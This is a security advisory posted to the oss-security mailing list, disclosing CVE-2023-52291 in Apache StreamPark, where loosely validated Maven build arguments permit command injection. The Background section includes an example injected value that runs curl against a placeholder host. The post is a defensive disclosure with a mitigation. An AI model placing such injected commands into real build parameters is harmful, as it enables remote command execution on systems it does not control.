Received: (qmail 3403 invoked by uid 550); 17 Jul 2024 12:57:53 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 13360 invoked from network); 17 Jul 2024 05:29:34 -0000
Authentication-Results: apache.org; auth=none
Content-Type: text/plain; charset=utf-8
From: Huajie Wang <benjobs@apache.org>
To: oss-security@lists.openwall.com
Message-ID: <94d2cdaf-1ec0-0b91-ad4f-cecca3c7d074@apache.org>
Content-Transfer-Encoding: quoted-printable
Date: Wed, 17 Jul 2024 05:29:22 +0000
MIME-Version: 1.0
Subject: [oss-security] CVE-2023-52291: Apache StreamPark (incubating): Unchecked maven
 build params could trigger remote command execution 

Severity: low

Affected versions:

- Apache StreamPark (incubating) 2.0.0 before 2.1.4

Description:

In streampark, the project module integrates Maven's compilation capabiliti=
es. The input parameter validation is not strict, allowing attackers to ins=
ert commands for remote command execution, The prerequisite for a successfu=
l attack is that the user needs to log in to the streampark system and have=
 system-level permissions. Generally, only users of that system have the au=
thorization to log in, and users would not manually input a dangerous opera=
tion command. Therefore, the risk level of this vulnerability is very low.

Background:

In the "Project" module, the maven build args=C2=A0=C2=A0=E2=80=9C<=E2=80=
=9D operator causes command injection. e.g : =E2=80=9C< (curl=C2=A0 http://=
xxx.com )=E2=80=9D will be executed as a command injection,

Mitigation:

all users should upgrade to 2.1.4,=C2=A0 The "<" operator will blocked=E3=
=80=82

Credit:

thiscodecc of MoyunSec Vlab and Bing (finder)

References:

https://streampark.incubator.apache.org
https://www.cve.org/CVERecord?id=3DCVE-2023-52291

